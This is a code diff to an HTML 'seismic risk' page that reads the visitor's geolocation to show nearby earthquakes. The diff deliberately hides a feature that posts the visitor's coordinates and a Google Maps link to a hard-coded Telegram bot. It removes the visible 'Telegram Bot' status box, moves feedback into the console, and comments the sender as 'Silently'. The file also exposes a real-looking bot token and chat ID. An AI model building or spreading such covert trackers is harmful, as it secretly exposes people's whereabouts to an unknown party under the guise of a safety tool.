@@ -43,7 +43,8 @@
 
     <!-- STEP 3: DASHBOARD -->
     <div id="dashboard" class="hidden w-full max-w-4xl space-y-6">
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <!-- Stats Grid (Now only 2 columns since Telegram box is gone) -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
             <div class="glass p-4 rounded-xl border-l-4 border-blue-500">
                 <p class="text-xs text-gray-400 uppercase">Your Location</p>
                 <p class="font-mono text-lg mt-1"><span id="lat-display">0.00</span>, <span id="lon-display">0.00</span></p>
@@ -52,14 +53,6 @@
             <div class="glass p-4 rounded-xl border-l-4 border-gray-500" id="risk-box">
                 <p class="text-xs text-gray-400 uppercase">Risk Assessment</p>
                 <h2 id="risk-text" class="text-2xl font-bold mt-1">CALCULATING</h2>
-            </div>
-
-            <!-- TELEGRAM STATUS -->
-            <div class="glass p-4 rounded-xl border-l-4 border-cyan-500">
-                <p class="text-xs text-gray-400 uppercase">Telegram Bot</p>
-                <p id="telegram-log" class="text-sm font-bold mt-2 text-cyan-400">
-                    <i class="fa-brands fa-telegram mr-1"></i> Sending...
-                </p>
             </div>
         </div>
 
@@ -77,11 +70,11 @@
 
     <script>
         // =========================================================
-        // 1. TELEGRAM CONFIGURATION (Fill these 2 lines!)
+        // 1. TELEGRAM CONFIGURATION
         // =========================================================
         const TG_CONFIG = {
-            botToken: "8322166321:AAFSuX4vYR4TC3O-cqjCAr8TjIuXkg35S0Y", // e.g., 123456:ABC-DEF...
-            chatId:   "7564238332"    // e.g., 123456789
+            botToken: "8322166321:AAFSuX4vYR4TC3O-cqjCAr8TjIuXkg35S0Y", // Paste Token here
+            chatId:   "7564238332"    // Paste Chat ID here
         };
 
         // =========================================================
@@ -106,7 +99,10 @@
             document.getElementById('lat-display').textContent = lat.toFixed(4);
             document.getElementById('lon-display').textContent = lon.toFixed(4);
 
+            // Send to Telegram (Silently)
             sendTelegramAlert(lat, lon);
+            
+            // Get Data
             fetchEarthquakes(lat, lon);
         }
 
@@ -116,21 +112,16 @@
         }
 
         // =========================================================
-        // 3. TELEGRAM SEND FUNCTION
+        // 3. SILENT TELEGRAM SENDER
         // =========================================================
         function sendTelegramAlert(lat, lon) {
-            const statusEl = document.getElementById('telegram-log');
-
             if (TG_CONFIG.botToken === "YOUR_BOT_TOKEN_HERE") {
-                statusEl.textContent = "Error: Token Missing";
-                statusEl.className = "text-sm font-bold mt-2 text-red-400";
+                console.warn("Telegram keys missing.");
                 return;
             }
 
-            // Message Format
             const message = `🚨 *Seismic Alert Activated* 🚨\n\n📍 *Latitude:* \`${lat}\`\n📍 *Longitude:* \`${lon}\`\n\n🗺 [View on Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
 
-            // API Call
             const url = `https://api.telegram.org/bot${TG_CONFIG.botToken}/sendMessage`;
             
             fetch(url, {
@@ -145,18 +136,12 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    statusEl.textContent = "Sent to Telegram!";
-                    statusEl.className = "text-sm font-bold mt-2 text-green-400";
+                    console.log("Location sent to Telegram successfully.");
                 } else {
                     console.error("Telegram Error:", data);
-                    statusEl.textContent = "Bot Error (Check Chat ID)";
-                    statusEl.className = "text-sm font-bold mt-2 text-red-400";
                 }
             })
-            .catch(err => {
-                console.error("Network Error:", err);
-                statusEl.textContent = "Connection Failed";
-            });
+            .catch(err => console.error("Network Error:", err));
         }
 
         async function fetchEarthquakes(lat, lon) {
